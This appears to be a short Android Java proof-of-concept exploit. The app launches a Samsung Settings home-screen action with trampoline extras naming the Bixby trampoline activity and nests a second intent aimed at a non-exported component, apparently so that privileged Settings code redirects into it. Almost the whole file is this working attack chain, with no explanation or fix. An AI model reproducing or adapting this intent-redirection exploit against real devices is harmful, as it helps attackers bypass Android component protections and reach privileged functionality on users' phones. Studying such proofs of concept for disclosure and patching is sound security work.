package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // payload for `com.samsung.android.settings.bixby.activity.BixbyTrampoline`
        Intent next = new Intent();
        next.setClass(this, NotExported.class);

        // payload for `com.android.settings.homepage.SettingsHomepageActivity`
        Intent i = new Intent("com.samsung.android.intent.action.HOME_SCREEN_SETTINGS");
        i.putExtra("from_search_trampoline", true);
        i.putExtra("targetAction", "wow");
        i.putExtra("targetPackage", "com.android.settings");
        i.putExtra("targetClass", "com.samsung.android.settings.bixby.activity.BixbyTrampoline");
        i.putExtra("android.intent.extra.INTENT", next);

        startActivity(i);
    }
}